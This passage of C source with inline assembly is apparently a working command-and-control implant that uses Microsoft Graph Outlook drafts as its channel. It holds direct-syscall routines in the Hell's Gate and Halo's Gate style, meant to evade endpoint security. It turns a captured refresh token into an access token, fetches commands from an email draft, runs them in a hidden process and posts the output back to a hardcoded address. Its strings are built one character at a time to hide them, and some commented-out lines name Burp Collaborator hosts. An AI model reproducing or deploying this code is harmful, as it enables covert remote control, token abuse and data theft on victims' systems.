	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
	"ret \n" // return ExportNameTable;
);
// Return the address of the Export Ordinal Table
// PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportOrdinalTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
	"ret \n" // return ExportOrdinalTable;
);
// PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
__asm__(
"getSymbolAddress: \n"
	"mov r10, [RSP+0x28] \n" // ExportNameTable
	"mov r11, [RSP+0x30] \n" // ExportOrdinalTable
	"xchg rcx, rdx \n" // RCX = symbolStringSize & RDX =symbolString
	"push rcx \n" // push str len to stack
	"xor rax, rax \n"
"loopFindSymbol: \n"
	"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
	"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
	"mov edi, [r10+rax*4] \n"       // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
	"add rdi, r8 \n"                // RDI = &NameString    = RVA NameString + &module.dll
	"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
	"repe cmpsb \n"                 // Compare strings at RDI & RSI
	"je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
	"inc rax \n"                    // Increment to check if the next name matches
	"jmp short loopFindSymbol \n"   // Jump back to start of loop
"FoundSymbol: \n"
	"pop rcx \n"                    // Remove string length counter from top of stack
	"mov ax, [r11+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
	"mov eax, [r9+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
	"add rax, r8 \n"                // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
	"sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
	"jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
	"xor rax, rax \n"               // If forwarder, return 0x0 and exit
"isNotForwarder: \n"
	"ret \n"
);
__asm__(
"findSyscallNumber: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
"error: \n"
	"xor rax, rax \n"
	"ret \n"
);
__asm__(
"halosGateUp: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"add rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
"halosGateDown: \n"
	"xor rsi, rsi \n"
	"xor rdi, rdi \n"
	"mov rsi, 0x00B8D18B4C \n"
	"xor rax, rax \n"
	"mov al, 0x20 \n"
	"mul dx \n"
	"sub rcx, rax \n"
	"mov edi, [rcx] \n"
	"cmp rsi, rdi \n"
	"jne error \n"
	"xor rax,rax \n"
	"mov ax, [rcx+4] \n"
	"ret \n"
);
__asm__(
	"HellsGate: \n"
	"xor r11, r11 \n"
	"mov r11d, ecx \n"
	"ret \n"
);
__asm__(
"HellDescent: \n"
	"xor rax, rax \n"
	"mov r10, rcx \n"
	"mov eax, r11d \n"
	"syscall \n"
	"ret \n"
);
char* getMsGraphAccessToken(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* sitename, char* clientId, char* tenantId, char* refreshToken, char* user_agent, char* response){

    HINTERNET hInternet = comms.InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    HINTERNET hConnect = comms.InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }
    CHAR stars[] = {'*','/','*',0};
    PCTSTR acceptTypes[] = { stars, NULL };
    CHAR method[] = {'P','O','S','T',0};
    char path[200];
    strFuncs.memset(path, 0, sizeof(path));
    //__debugbreak();
    //strFuncs.sprintf(path, "/%s/oauth2/token?api-version=1.0", tenantId);
    CHAR slash[] = {'/',0};
    CHAR apiPath[] = {'/','o','a','u','t','h','2','/','t','o','k','e','n','?','a','p','i','-','v','e','r','s','i','o','n','=','1','.','0',0};
    k32.lstrcatA(path,slash);
    k32.lstrcatA(path,tenantId);
    k32.lstrcatA(path,apiPath);
    HINTERNET hRequest = comms.HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use Refresh Token of controlled user to get a short-lived Access Token
    char parameters[2000];
    strFuncs.memset(parameters, 0, sizeof(parameters));
    CHAR resourceVar[] = {'r','e','s','o','u','r','c','e','=',0};
    CHAR resource[] = {'h','t','t','p','s','%','3','a','%','2','f','%','2','f','g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0}; // resource 
    CHAR clientidVar[] = {'&','c','l','i','e','n','t','_','i','d','=',0};
    CHAR grantTypeVar[] = {'&','g','r','a','n','t','_','t','y','p','e','=',0};
    CHAR grantType[] = {'r','e','f','r','e','s','h','_','t','o','k','e','n',0};
    CHAR refreshTokenVar[] = {'&','r','e','f','r','e','s','h','_','t','o','k','e','n','=',0};
    CHAR scopeVar[] = {'&','s','c','o','p','e','=',0};
    CHAR scope[] = {'o','p','e','n','i','d',0};
    //strFuncs.sprintf(parameters, "resource=%s&client_id=%s&grant_type=%s&refresh_token=%s&scope=%s", resource, clientId, grantType, refreshToken, scope);
    k32.lstrcatA(parameters,resourceVar);
    k32.lstrcatA(parameters,resource);
    k32.lstrcatA(parameters,clientidVar);
    k32.lstrcatA(parameters,clientId);
    k32.lstrcatA(parameters,grantTypeVar);
    k32.lstrcatA(parameters,grantType);
    k32.lstrcatA(parameters,refreshTokenVar);
    k32.lstrcatA(parameters,refreshToken);
    k32.lstrcatA(parameters,scopeVar);
    k32.lstrcatA(parameters,scope);
    int paramSize = k32.lstrlenA(parameters);
    // https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
    // Send the queued HTTPS Request
    //  BOOL HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL bRequestSent = comms.HttpSendRequestA(hRequest, NULL, 0, parameters, paramSize);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = comms.InternetReadFile(hRequest, response, nBuffSize, &dwBytesRead);
    }
    comms.InternetCloseHandle(hRequest);
    comms.InternetCloseHandle(hConnect);
    comms.InternetCloseHandle(hInternet);
    // Get the address of the start of the access token string
    char searchAT[] = {'a','c','c','e','s','s','_','t','o','k','e','n',0};
    char* accessToken = strFuncs.strstr(response, searchAT);
    accessToken += 15;
    // Get the address of the quote that is at the end of the access token string
    char searchRT[] = {'r','e','f','r','e','s','h','_','t','o','k','e','n',0};
    char* accessTokenEnd = strFuncs.strstr(response, searchRT);
    accessTokenEnd -= 3;
    // Change the quote to a null byte to end the string
    strFuncs.memset(accessTokenEnd, 0, 32);
    // return the access token string
    return accessToken;
}

char* getCommandFromDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* accessToken, char* user_agent, char* buff)
{
    char* emailBody = buff;
    HINTERNET hInternet = comms.InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    CHAR sitename[] = {'g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0};
    //char sitename[] = "806ppx6zpht9jlzxx49xr26urlxbl0.burpcollaborator.net";
    HINTERNET hConnect = comms.InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }    
    CHAR stars[] = {'*','/','*',0};
    PCTSTR acceptTypes[] = { stars, NULL };
    CHAR method[] = {'G','E','T',0};
    CHAR path[] = {'/','v','1','.','0','/','m','e','/','M','a','i','l','F','o','l','d','e','r','s','/','d','r','a','f','t','s','/','m','e','s','s','a','g','e','s','?','s','e','l','e','c','t','=','b','o','d','y','&','t','o','p','=','1',0};

    // Use HTTPS and do not save response to the wininet cache
    HINTERNET hRequest = comms.HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use MS Graph Access Token to get the most recent email from the inbox
    char headers[4000];
    strFuncs.memset(headers, 0, sizeof(headers));
    //strFuncs.sprintf(headers, "Authorization: Bearer %s", accessToken);
    CHAR CONTENTT[] = {'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'A','u','t','h','o','r','i','z','a','t','i','o','n',':',' ','B','e','a','r','e','r',' ',0};
    k32.lstrcatA(headers,CONTENTT);
    k32.lstrcatA(headers,accessToken);
    int headerSize = k32.lstrlenA(headers);
    BOOL bRequestSent = comms.HttpSendRequestA(hRequest, headers, headerSize, NULL, (DWORD_PTR)NULL);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = comms.InternetReadFile(hRequest, emailBody, nBuffSize, &dwBytesRead);
    }
    comms.InternetCloseHandle(hRequest);
    comms.InternetCloseHandle(hConnect);
    comms.InternetCloseHandle(hInternet);
    char search1[] = {'c','o','n','t','e','n','t','"',':','"',0};
    char* command = strFuncs.strstr(emailBody, search1);
    if ((PVOID)command < (PVOID)0x1000) {
        command = NULL;
        return command;
    }
    command += 10;
    char search2[] = {'@','o','d','a','t','a','.','n','e','x','t','L','i','n','k',0};
    char* commandEnd = strFuncs.strstr(emailBody, search2);
    commandEnd -= 6;
    strFuncs.memset(commandEnd, 0, 1);
    return command;
}

// Create a Draft Email - Microsoft Graph REST API v1.0
// https://docs.microsoft.com/en-us/graph/api/user-post-messages?view=graph-rest-1.0&tabs=http
/*
POST https ://graph.microsoft.com/v1.0/me/messages
Content - type : application / json
 {"subject":"Did you see last night's game?","importance":"Low","body":{"contentType":"HTML","content":"They were <b>awesome</b>!"},"toRecipients":[
 {"emailAddress":{"address":"AdeleV@contoso.onmicrosoft.com"}}]}
*/
char* createEmailDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* accessToken, char* user_agent, char* egressBuffer, char* ingressBuffer)
{
    HINTERNET hInternet = comms.InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    CHAR sitename[] = {'g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0};
    //char sitename[] = "upncetbihcrrd4juh8jmooq5ww2mqb.burpcollaborator.net";
    HINTERNET hConnect = comms.InternetConnectA(hInternet, sitename, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (hConnect == NULL)
    {
        return NULL;
    }
    CHAR stars[] = {'*','/','*',0};
    PCTSTR acceptTypes[] = { stars, NULL };
    CHAR method[] = {'P','O','S','T',0};
    char path[] = {'/','v','1','.','0','/','m','e','/','m','e','s','s','a','g','e','s',0};
    HINTERNET hRequest = comms.HttpOpenRequestA(hConnect, method, path, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (hRequest == NULL)
    {
        return NULL;
    }
    // Use MS Graph Access Token to get the most recent email from the inbox
    CHAR headers[4000];
    //__debugbreak();
    strFuncs.memset(headers, 0, sizeof(headers));
    // strFuncs.sprintf(headers, "Content-type: application/json\r\nAuthorization: Bearer %s", accessToken);
    CHAR CONTENTT[] = {'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'A','u','t','h','o','r','i','z','a','t','i','o','n',':',' ','B','e','a','r','e','r',' ',0};
    k32.lstrcatA(headers,CONTENTT);
    k32.lstrcatA(headers,accessToken);
    int headerSize = k32.lstrlenA(headers);
    char parameters[8000];
    strFuncs.memset(parameters, 0, sizeof(parameters));
    // Cut off the egress buffer so it doesn't overwrite everything
    strFuncs.memset(egressBuffer + 7000, 0, 1);
    //char exfiltrate[] = "egress message";
    //strFuncs.sprintf(parameters, "{\"subject\":\"Azure Outlook Command & Control\", \"importance\" : \"High\", \"body\" : {\"contentType\":\"TEXT\", \"content\" : \"%s\"}, \"toRecipients\" : [{\"emailAddress\":{\"address\":\"Bobby.Cooke@0xBoku.com\"}}]}", egressBuffer);
    CHAR jsonString1[] = {'{','"','s','u','b','j','e','c','t','"',':','"','A','z','u','r','e',' ','O','u','t','l','o','o','k',' ','C','o','m','m','a','n','d',' ','&',' ','C','o','n','t','r','o','l','"',',',' ','"','i','m','p','o','r','t','a','n','c','e','"',' ',':',' ','"','H','i','g','h','"',',',' ','"','b','o','d','y','"',' ',':',' ','{','"','c','o','n','t','e','n','t','T','y','p','e','"',':','"','T','E','X','T','"',',',' ','"','c','o','n','t','e','n','t','"',' ',':',' ','"',0};
    k32.lstrcatA(parameters,jsonString1); 
    k32.lstrcatA(parameters,egressBuffer); 
    CHAR jsonString2[] = {'"','}',',',' ','"','t','o','R','e','c','i','p','i','e','n','t','s','"',' ',':',' ','[','{','"','e','m','a','i','l','A','d','d','r','e','s','s','"',':','{','"','a','d','d','r','e','s','s','"',':','"','B','o','b','b','y','.','C','o','o','k','e','@','0','x','B','o','k','u','.','c','o','m','"','}','}',']','}',0};
    k32.lstrcatA(parameters,jsonString2); 
    int paramSize = k32.lstrlenA(parameters);
    // https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
    // Send the queued HTTPS Request
    //  BOOL HttpSendRequestA( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL bRequestSent = comms.HttpSendRequestA(hRequest, headers, headerSize, parameters, paramSize);
    if (bRequestSent == FALSE)
    {
        return NULL;
    }
    BOOL bKeepReading = TRUE;
    const int nBuffSize = 100000;
    DWORD dwBytesRead = -1;
    while (bKeepReading && dwBytesRead != 0) {
        bKeepReading = comms.InternetReadFile(hRequest, ingressBuffer, nBuffSize, &dwBytesRead);
    }
    comms.InternetCloseHandle(hRequest);
    comms.InternetCloseHandle(hConnect);
    comms.InternetCloseHandle(hInternet);
    return ingressBuffer;
}

// https://docs.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
// https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout
HANDLE runCommandAsProcess(msvcrtStruct strFuncs, k32Struct k32, char* command)
{
    HANDLE pipeIN, pipeOUT;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES saAttr;
    strFuncs.memset(&saAttr, 0, sizeof(saAttr));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    // Create a pipe for the child process's STDOUT. 
    k32.CreatePipe(&pipeOUT, &pipeIN, &saAttr, 0);
    // Ensure the read handle to the pipe for STDOUT is not inherited.
    k32.SetHandleInformation(pipeOUT, HANDLE_FLAG_INHERIT, 0);
    strFuncs.memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = pipeIN;
    si.hStdOutput = pipeIN;
    si.dwFlags |= STARTF_USESTDHANDLES;
    strFuncs.memset(&pi, 0, sizeof(pi));
    // Start the child process. 
    k32.CreateProcessA(NULL, (TCHAR*)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    // Wait until the command runs in the process and the process closes
    //   For commands that take a long time to output this is required or the output will be null
    k32.WaitForSingleObject(pi.hProcess, 20000);
    // Close handles to the child process and its primary thread.
    // Some applications might keep these handles to monitor the status
    // of the child process, for example. 
    k32.CloseHandle(pi.hProcess);
    k32.CloseHandle(pi.hThread);
    // Close the write end of the pipe before reading to avoid hanging
    k32.CloseHandle(pipeIN);
    return pipeOUT;
}

void ReadFromPipe(k32Struct k32, char* egressBuffer, HANDLE pipeOUT)
// Read output from the child process's pipe for STDOUT and write to the parent process's pipe for STDOUT.
{
    DWORD dwRead = 0;
    k32.ReadFile(pipeOUT, egressBuffer, 4096, &dwRead, NULL);
    k32.CloseHandle(pipeOUT);
}

void cleanOutput(msvcrtStruct strFuncs, char* buffer)
{
    char dquote[] = {'"',0};
    char* replace;
    // Clean up double quotes because it breaks JSON
    while (strFuncs.strstr(buffer, dquote))
    {
        replace = strFuncs.strstr(buffer, dquote);
        // Change the quote to a space byte
        strFuncs.memset(replace, 0x20, 1);
    }
    // Clean up backslash because it breaks JSON
    char bslash[] = {'\\',0};
    while (strFuncs.strstr(buffer, bslash))
    {
        replace = strFuncs.strstr(buffer, bslash);
        // Change the bslash to a space byte
        strFuncs.memset(replace, 0x20, 1);
    }
}

void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* commandStruct)
{
    // the first word in the command string is the meta command
    commandStruct->metaCommand = command;
    char space[] = {' ',0};
    char* replace = strFuncs.strstr(command, space);
    if (replace)
    {
        commandStruct->command = replace + 1;
        // Change the first space to a null string delimiter
        strFuncs.memset(replace, 0, 1);
    }
    return;
}
